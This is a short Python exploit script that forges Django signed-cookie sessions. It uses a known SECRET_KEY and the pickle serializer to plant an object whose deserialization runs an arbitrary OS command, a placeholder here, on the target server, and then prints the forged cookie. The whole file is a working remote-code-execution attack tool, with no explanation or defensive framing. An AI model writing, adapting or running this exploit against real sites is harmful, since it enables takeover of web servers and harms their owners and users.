import django.core.signing, django.contrib.sessions.serializers,pickle,os,sys,json
from django.http import HttpResponse

class PickleRce(object):
    def __reduce__(self):
        return (os.system,('YOUR OS COMMAND HERE',))

with open("settings.json","r") as settings:
    data = json.load(settings)
    SECRET_KEY=data['settings'][0]['SECRET_KEY']
    SettingsPath=data['settings'][0]['settingsPath']
    cookie=data['settings'][0]['Sites_COOKIE']

try:
    os.environ["DJANGO_SETTINGS_MODULE"] = SettingsPath
    newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')                              
    newContent['testcookie'] = PickleRce()

    cookie = django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)                 
    print("Forged cookie:\n" + cookie)
except:
    print("an error occurred during forging process , please check settings.py path")